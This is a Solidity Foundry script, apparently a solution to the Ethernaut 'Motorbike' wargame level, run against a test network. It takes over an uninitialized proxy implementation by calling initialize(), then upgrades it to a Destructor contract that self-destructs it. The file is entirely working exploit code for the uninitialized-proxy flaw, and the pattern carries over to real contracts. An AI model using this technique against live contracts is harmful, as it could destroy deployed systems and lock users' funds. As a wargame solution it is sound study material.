//SPDX-License-Identifier: UNLICENSED
// source ../.env; forge script ./script/HackMotorbike.s.sol --private-key $ETHERNAUGHT_PRIVATE_KEY --broadcast --rpc-url $GORELI_OPTIMISIM_RPC -vvvv;
pragma solidity 0.6.12;

import "forge-std/Script.sol";
import "../src/Motorbike.sol";
import "../src/Destructor.sol";

contract HackMotorbike is Script {
    Destructor destructor;
    Motorbike motorbike = Motorbike(0x794DF4dEF19CE4Af937542F45C7E8491C04CdEAd);
    
    // Load Engine address from constant _IMPLEMENTATION_SLOT -> keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    Engine engine = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

    function run() public {
        // Labels for console
        vm.label(address(this), "Attacker");
        vm.label(address(motorbike), "Motorbike");
        vm.label(address(engine), "Engine");

        vm.startBroadcast();

        destructor = new Destructor();
        vm.label(address(destructor), "Destructor");

        // Manually init the Engine to set us as upgrader rather than Motorbike
        engine.initialize();
        console.log("Upgrader address is ", engine.upgrader());
        require(address(engine.upgrader()) == address(msg.sender));
        // For soem reason vm.assertEq(address(engine.upgrader()), address(msg.sender)); does not work here

        // Encode the function name we want to call
        bytes memory encodedFunc = abi.encodeWithSignature("destruct()");
        engine.upgradeToAndCall(address(destructor), encodedFunc);

        vm.stopBroadcast();
    }
}